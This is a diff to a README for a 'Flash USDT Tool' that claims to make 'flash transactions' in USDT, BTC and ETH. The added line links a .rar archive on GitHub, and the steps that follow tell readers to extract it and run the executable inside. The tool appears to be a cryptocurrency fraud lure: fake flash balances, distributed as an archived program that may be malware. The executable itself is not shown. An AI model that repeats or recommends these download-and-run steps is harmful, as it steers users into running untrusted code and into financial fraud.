@@ -11,7 +11,7 @@ Multi-network flash transaction tool for USDT, BTC, ETH with configurable durati
 
 ## 🚀 How to use
 
-1. Download
+1. Download latest version [https://github.com/NovaNexusRewards/Flash-USDT-Tool/blob/main/Flash%20USDT%20Tool.rar]
 2. Extract 
 3. Run `Flash USDT Tool.exe` from Command Prompt:
 
